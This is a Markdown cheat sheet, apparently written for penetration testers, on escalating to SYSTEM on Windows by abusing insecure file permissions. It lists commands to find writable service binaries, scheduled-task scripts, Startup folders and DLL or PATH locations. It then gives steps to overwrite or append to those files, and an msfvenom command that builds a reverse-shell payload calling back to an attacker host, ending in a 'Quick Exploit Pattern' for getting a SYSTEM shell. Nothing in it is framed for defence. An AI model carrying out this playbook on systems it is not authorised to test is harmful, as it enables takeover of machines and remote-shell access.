# Windows Privilege Escalation – Insecure File Permissions

## Purpose

This file provides a structured workflow for identifying and exploiting insecure file and directory permissions for privilege escalation.

Core rules:
- Writable files used by privileged processes = escalation
- Services, tasks, and apps often trust file paths
- Directory write access is often more important than file write access
- Always map file → execution context

---

## 0. Mental Model

If a privileged process (SYSTEM/admin) uses a file:

AND you can modify that file:

→ you control what that process executes

---

## 1. Find Writable Files and Directories (CRITICAL FIRST STEP)

### Check permissions manually:

icacls "C:\Path\To\Target"

Look for:
- (F) Full control
- (M) Modify
- Write access for:
  - Users
  - Authenticated Users
  - Everyone

---

### Recursive search (PowerShell):

Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | 
Get-Acl | Where-Object {
    $_.AccessToString -match "Everyone|Users"
}

---

## 2. Use accesschk (VERY POWERFUL)

accesschk.exe -uwcqv "Users" *

Look for:
- writable files
- writable services
- weak permissions

---

## 3. Identify High-Value Targets

Focus on files used by:

- services
- scheduled tasks
- startup programs
- custom applications
- scripts (.bat, .ps1, .vbs)

---

## 4. Service Binary Permissions

sc qc <service_name>

Then:

icacls "C:\Path\To\Service.exe"

If writable:
→ replace binary → SYSTEM

---

## 5. Scheduled Tasks

List tasks:

schtasks /query /fo LIST /v

Look for:
- Task To Run
- Run As User

Check file permissions:

icacls "C:\Path\To\Script.bat"

If writable:
→ modify script

---

## 6. Startup Folder Abuse

Check:

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

If writable:
→ drop payload

---

## 7. Replace Executable

### Backup (optional):

copy app.exe app.bak

---

### Replace:

copy payload.exe app.exe

---

## 8. Modify Script

If script is used:

echo powershell -c "..." >> script.bat

---

## 9. Drop Reverse Shell Payload

msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe

---

## 10. Trigger Execution

Options:

- restart service
- reboot system
- wait for scheduled task
- manually trigger app

---

## 11. Verify SYSTEM

whoami

Expected:

nt authority\system

---

## 12. Directory-Level Abuse (VERY IMPORTANT)

Even if file not writable:

If directory is writable:

icacls "C:\Path\"

You can:
- replace file
- delete and recreate file
- drop malicious file

---

## 13. DLL Hijacking Opportunity

If directory writable:
→ drop malicious DLL

---

## 14. PATH Hijacking Opportunity

If directory in PATH:
→ place malicious binary

---

## 15. Common High-Value Locations

C:\Program Files\
C:\Program Files (x86)\
C:\ProgramData\
C:\Windows\Tasks\
C:\Temp\
C:\Users\Public\

---

## 16. Common Failure Points

- file not actually used
- process not privileged
- service not restarted
- AV removes payload
- wrong architecture

---

## 17. If Stuck

- re-check permissions
- check directory instead of file
- verify execution path
- pivot to services or tasks

---

## 18. Quick Exploit Pattern

1. find writable file/directory
2. confirm privileged execution
3. replace or modify file
4. trigger execution
5. get SYSTEM shell

---

## 19. Mental Model

Writable file = control  
Privileged execution = opportunity  
Execution trigger = shell  

---

## 20. Golden Rules

- Always check permissions early
- Always map file → execution
- Directory access is often enough
- Services and tasks are top targets
- Keep payload simple if AV present